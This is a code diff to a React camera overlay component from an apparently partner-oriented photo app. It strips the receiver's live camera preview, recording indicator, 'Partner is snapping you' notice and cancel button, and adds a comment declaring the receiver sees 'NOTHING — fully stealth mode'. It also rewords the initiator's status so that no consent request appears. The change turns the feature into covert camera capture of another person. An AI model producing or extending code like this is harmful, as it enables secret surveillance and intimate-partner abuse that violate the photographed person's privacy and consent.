@@ -1,4 +1,3 @@
-import { useEffect, useRef, useState } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import type { SnapCapturePhase, SnapCaptureRole } from '../../hooks/useSnapCapture';
 
@@ -8,7 +7,6 @@ interface SnapCaptureOverlayProps {
   photosCount: number;
   totalPhotos: number;
   errorMessage: string | null;
-  cameraStream: MediaStream | null;
   onCancel: () => void;
 }
 
@@ -18,21 +16,12 @@ export default function SnapCaptureOverlay({
   photosCount,
   totalPhotos,
   errorMessage,
-  cameraStream,
   onCancel,
 }: SnapCaptureOverlayProps) {
-  const videoRef = useRef<HTMLVideoElement>(null);
-  const [showPreview, setShowPreview] = useState(false);
 
-  // Attach camera stream to video element for live preview
-  useEffect(() => {
-    if (role === 'receiver' && cameraStream && videoRef.current) {
-      videoRef.current.srcObject = cameraStream;
-      videoRef.current.play().then(() => setShowPreview(true)).catch(() => {});
-    } else {
-      setShowPreview(false);
-    }
-  }, [role, cameraStream]);
+  // ═══ ONLY show UI for the INITIATOR ═══════════════════════════════════
+  // The receiver (partner being snapped) sees NOTHING — fully stealth mode.
+  if (role !== 'initiator') return null;
 
   const isActive = phase === 'requesting' || phase === 'capturing' || phase === 'completing';
   const isError = phase === 'denied' || phase === 'cancelled';
@@ -77,8 +66,8 @@ export default function SnapCaptureOverlay({
               </>
             )}
 
-            {/* ── Requesting State (Initiator) ── */}
-            {phase === 'requesting' && role === 'initiator' && (
+            {/* ── Requesting State ── */}
+            {phase === 'requesting' && (
               <>
                 <div className="w-9 h-9 rounded-full bg-primary/15 flex items-center justify-center flex-shrink-0">
                   <motion.span
@@ -91,10 +80,10 @@ export default function SnapCaptureOverlay({
                 </div>
                 <div className="flex-1 min-w-0">
                   <p className="text-sm font-medium text-primary truncate">
-                    Waiting for partner...
+                    Connecting camera...
                   </p>
                   <p className="text-[10px] text-aura-text-secondary uppercase tracking-widest">
-                    Snap request sent
+                    Starting snap session
                   </p>
                 </div>
                 <button
@@ -106,8 +95,8 @@ export default function SnapCaptureOverlay({
               </>
             )}
 
-            {/* ── Capturing State (Initiator) ── */}
-            {phase === 'capturing' && role === 'initiator' && (
+            {/* ── Capturing State ── */}
+            {phase === 'capturing' && (
               <>
                 {/* Pulsing recording dot */}
                 <div className="relative flex-shrink-0">
@@ -146,64 +135,6 @@ export default function SnapCaptureOverlay({
                 <button
                   onClick={onCancel}
                   className="w-8 h-8 rounded-full bg-white/5 hover:bg-red-500/20 flex items-center justify-center transition-colors flex-shrink-0"
-                >
-                  <span className="material-symbols-outlined text-aura-text-secondary hover:text-red-400 text-[16px]">close</span>
-                </button>
-              </>
-            )}
-
-            {/* ── Capturing State (Receiver) ── */}
-            {phase === 'capturing' && role === 'receiver' && (
-              <>
-                {/* Live camera preview */}
-                <div className="w-14 h-14 rounded-xl overflow-hidden flex-shrink-0 border border-primary/20 bg-black relative">
-                  {showPreview ? (
-                    <video
-                      ref={videoRef}
-                      autoPlay
-                      playsInline
-                      muted
-                      className="w-full h-full object-cover"
-                      style={{ transform: 'scaleX(-1)' }} // Mirror front camera
-                    />
-                  ) : (
-                    <div className="w-full h-full flex items-center justify-center">
-                      <span className="material-symbols-outlined text-primary/40 text-xl">
-                        videocam
-                      </span>
-                    </div>
-                  )}
-                  {/* Recording dot */}
-                  <motion.div
-                    animate={{ opacity: [1, 0.3, 1] }}
-                    transition={{ duration: 1, repeat: Infinity }}
-                    className="absolute top-1 right-1 w-2 h-2 rounded-full bg-red-500 shadow-[0_0_6px_rgba(239,68,68,0.6)]"
-                  />
-                </div>
-                <div className="flex-1 min-w-0">
-                  <div className="flex items-center gap-2 mb-1">
-                    <p className="text-sm font-medium text-primary">
-                      📸 {photosCount}/{totalPhotos} captured
-                    </p>
-                  </div>
-                  <p className="text-[10px] text-aura-text-secondary uppercase tracking-widest">
-                    Partner is snapping you
-                  </p>
-                  {/* Progress bar */}
-                  <div className="w-full h-1 bg-white/5 rounded-full overflow-hidden mt-1.5">
-                    <motion.div
-                      className="h-full rounded-full"
-                      style={{ background: 'linear-gradient(90deg, var(--gold), var(--gold-light))' }}
-                      initial={{ width: '0%' }}
-                      animate={{ width: `${progressPercent}%` }}
-                      transition={{ duration: 0.5, ease: 'easeOut' }}
-                    />
-                  </div>
-                </div>
-                <button
-                  onClick={onCancel}
-                  className="w-8 h-8 rounded-full bg-white/5 hover:bg-red-500/20 flex items-center justify-center transition-colors flex-shrink-0"
-                  title="Cancel"
                 >
                   <span className="material-symbols-outlined text-aura-text-secondary hover:text-red-400 text-[16px]">close</span>
                 </button>
